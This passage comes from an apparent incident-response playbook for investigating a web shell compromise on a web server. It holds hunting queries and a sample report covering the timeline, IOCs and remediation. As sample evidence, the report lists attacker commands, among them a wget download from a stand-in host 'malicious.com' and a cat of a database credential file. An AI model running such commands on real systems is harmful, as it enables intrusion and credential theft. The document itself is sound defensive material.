```bash
# Check for file reads in sensitive directories
dir_list /var/www/html/config
dir_list /etc

# Look for database credential files
file_info /var/www/html/config/database.php
```

**What files were modified**:
```
-7d | routing/hostname == "web-server" | FILE_MODIFIED NEW_DOCUMENT | event/TIMESTAMP as time event/FILE_PATH as file
```

**Network connections (potential data exfiltration)**:
```
-7d | routing/hostname == "web-server" | NETWORK_CONNECTIONS | event/NETWORK_ACTIVITY/BYTES_SENT > 1048576 | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst event/NETWORK_ACTIVITY/BYTES_SENT as bytes
```

---

### Phase 10: Reporting

**Key Report Sections**:

1. **Executive Summary**
   - Web server compromised via web shell
   - Initial access: [Date/Time, method]
   - Web shell location: [Path]
   - Attacker IP addresses: [List]
   - Commands executed: [Summary]
   - Persistence: [Yes/No, methods]

2. **Attack Timeline**
   | Time (UTC) | Event | Evidence |
   |------------|-------|----------|
   | 2024-01-10 10:15 | File upload vulnerability exploited | Web access logs |
   | 2024-01-10 10:16 | Web shell uploaded | NEW_DOCUMENT event |
   | 2024-01-10 10:17 | First access to web shell | Access logs, NEW_PROCESS |
   | 2024-01-10 10:20 | Reconnaissance commands | Command history |
   | 2024-01-10 10:25 | Additional tools downloaded | wget command |
   | 2024-01-10 10:30 | SSH key added for persistence | authorized_keys modified |
   | 2024-01-10 11:00 | Database accessed | mysql process |

3. **Initial Access Vector**
   - Vulnerability: File upload bypass (CVE-XXXX-XXXX)
   - Affected component: upload.php (no file type validation)
   - Exploit method: Uploaded PHP file with double extension

4. **Web Shell Analysis**
   - File: /var/www/html/uploads/shell.php
   - Hash: abc123def456...
   - Type: WSO web shell (variant)
   - Capabilities: Command execution, file manager, SQL client
   - Source IP: 203.0.113.50

5. **Commands Executed**
   - whoami, id, uname -a (reconnaissance)
   - ls -la /var/www/html/config (configuration discovery)
   - cat /var/www/html/config/database.php (credential theft)
   - wget http://malicious.com/tools.tar.gz (tool download)
   - tar -xzf tools.tar.gz (archive extraction)
   - mysql -u root -p database_name (database access)

6. **Persistence Mechanisms**
   - SSH public key added: /root/.ssh/authorized_keys
   - Cron job created: /etc/cron.d/update (connects to C2)
   - Additional web shells: /var/www/html/images/favicon.php

7. **Data Accessed**
   - Database credentials: CONFIRMED
   - User database: ACCESSED (via mysql commands)
   - Configuration files: READ
   - Potential PII exposure: HIGH RISK

8. **Network Indicators**
   - Attacker IP: 203.0.113.50 (primary)
   - Secondary IPs: 198.51.100.25
   - C2 infrastructure: malicious-c2.com
   - Tools downloaded from: malicious.com

9. **IOCs**
   - File Hashes:
     - abc123... (shell.php)
     - def456... (favicon.php - additional shell)
   - File Paths:
     - /var/www/html/uploads/shell.php
     - /var/www/html/images/favicon.php
   - IP Addresses:
     - 203.0.113.50 (attacker)
     - 198.51.100.25 (secondary)
   - Domains:
     - malicious-c2.com
     - malicious.com

10. **Remediation Actions**
    - Remove web shells: COMPLETED
    - Remove SSH keys: COMPLETED
    - Remove cron jobs: COMPLETED
    - Patch vulnerability: IN PROGRESS
    - Reset credentials: IN PROGRESS
    - Review logs for data exfiltration: IN PROGRESS

11. **Recommendations**
    - Patch web application immediately
    - Implement file upload restrictions (whitelist, content validation)
    - Web Application Firewall (WAF) deployment
    - Input validation and sanitization
    - Principle of least privilege (web server user permissions)
    - File integrity monitoring
    - Regular security audits and penetration testing
    - Incident response plan review

---

## Additional Resources

**For command reference**: See REFERENCE.md

**For advanced analysis**: See ADVANCED.md

**For troubleshooting**: See TROUBLESHOOTING.md

**For core methodology**: See SKILL.md
